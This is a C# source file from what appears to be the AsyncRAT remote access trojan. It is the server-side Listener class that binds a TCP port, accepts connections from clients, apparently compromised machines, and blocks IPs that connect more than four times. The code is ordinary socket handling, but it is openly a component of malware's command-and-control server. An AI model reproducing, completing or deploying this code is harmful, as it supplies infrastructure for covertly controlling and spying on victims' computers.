using System.Net;
using System.Net.Sockets;
using System;
using System.Windows.Forms;
using System.Drawing;
using AsyncRAT_Sharp.Handle_Packet;
using System.Linq;

namespace AsyncRAT_Sharp.Sockets
{
    class Listener
    {
        private Socket Server { get; set; }

        public void Connect(object port)
        {
            try
            {
                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    SendBufferSize = 50 * 1024,
                    ReceiveBufferSize = 50 * 1024,
                    ReceiveTimeout = -1,
                    SendTimeout = -1,
                };
                Server.Bind(ipEndPoint);
                Server.Listen(30);
                new HandleLogs().Addmsg($"Listenning {port}", Color.Green);
                Server.BeginAccept(EndAccept, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                Socket socket = Server.EndAccept(ar);
                if (IsDublicated(socket))
                {
                    socket.Dispose();
                }
                else
                {
                    new Clients(socket);
                }
            }
            finally
            {
                Server.BeginAccept(EndAccept, null);
            }
        }

        private bool IsDublicated(Socket socket)
        {
            if (Settings.Blocked.Contains(socket.RemoteEndPoint.ToString().Split(':')[0]))
            {
                return true;
            }

            int count = 0;
            foreach (Clients client in Settings.Online.ToList())
            {
                if (client.LV != null)
                {
                    if (client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0] == socket.RemoteEndPoint.ToString().Split(':')[0])
                        count++;
                }
            }

            if (count > 4)
            {
                Settings.Blocked.Add(socket.RemoteEndPoint.ToString().Split(':')[0]);
                new HandleLogs().Addmsg($"Client {socket.RemoteEndPoint.ToString().Split(':')[0]} tried to spam, IP blocked", Color.Red);
                foreach (Clients client in Settings.Online.ToList())
                {
                    if (client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0] == socket.RemoteEndPoint.ToString().Split(':')[0] && client.LV != null)
                    {
                        try
                        {
                            client.Disconnected();
                        }
                        catch { }
                    }
                }
                return true;
            }
            return false;
        }
    }
}